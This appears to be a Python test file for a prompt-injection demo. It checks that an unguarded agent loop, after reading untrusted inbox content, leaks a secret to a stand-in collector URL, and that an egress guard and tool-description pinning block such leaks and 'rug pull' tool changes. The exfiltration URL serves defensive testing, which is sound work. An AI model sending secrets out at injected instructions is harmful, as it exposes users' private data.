from fake_llm import FakeAnthropic, text, tool_use
from injection_demo.trifecta import (SECRET, check_pins, demo, demo_pinning, fingerprint, inbox_handlers,
                                     pin_tools, run_agent, script)

quiet = {"log": lambda _: None}


def test_naive_loop_leaks_secret(capsys):
    r, outbox = demo(guard=False)
    assert outbox == [f"https://collector.example/c?code={SECRET}"]
    assert r.blocked == []


def test_guard_blocks_egress_after_untrusted_read(capsys):
    r, outbox = demo(guard=True)
    assert outbox == []
    assert r.blocked == ["fetch_url"]
    assert "已被拦下" in r.answer
    # 被拦的调用也有 tool_result，并且标成错误：历史保持合法
    last_results = r.messages[4]["content"]
    assert [b["type"] for b in last_results] == ["tool_result"]
    assert last_results[0]["is_error"] is True
    assert last_results[0]["tool_use_id"] == r.messages[3]["content"][-1].id


def test_egress_allowed_before_any_untrusted_read():
    outbox: list[str] = []
    client = FakeAnthropic([tool_use("send_message", {"to": "alice", "text": "我晚点到"}), text("发了")])
    r = run_agent(client, "告诉 alice 我晚点到", inbox_handlers(outbox), guard=True, **quiet)
    assert outbox == ["alice: 我晚点到"] and r.blocked == []


def test_confirmed_egress_goes_through():
    outbox: list[str] = []
    seen = []

    def confirm(name, args):
        seen.append((name, args["url"]))  # 确认界面要看到完整参数
        return True

    run_agent(FakeAnthropic(script()), "整理收件箱", inbox_handlers(outbox), guard=True, confirm=confirm, **quiet)
    assert seen == [("fetch_url", f"https://collector.example/c?code={SECRET}")]
    assert len(outbox) == 1


def test_pinning_detects_rug_pull(capsys):
    assert demo_pinning() == ["get_weather"]


def test_pinning_stable_and_flags_new_tools():
    tools = [{"name": "a", "description": "x", "input_schema": {"type": "object", "properties": {}}}]
    pins = pin_tools(tools)
    assert check_pins(pins, tools) == []
    # schema 改了也算变化；批准时没有的新工具也要拦
    changed_schema = [{**tools[0], "input_schema": {"type": "object", "properties": {"p": {"type": "string"}}}}]
    assert check_pins(pins, changed_schema) == ["a"]
    assert check_pins(pins, tools + [{**tools[0], "name": "b"}]) == ["b"]
    # 键顺序不影响哈希
    assert fingerprint(tools[0]) == fingerprint({"input_schema": tools[0]["input_schema"], "description": "x"})
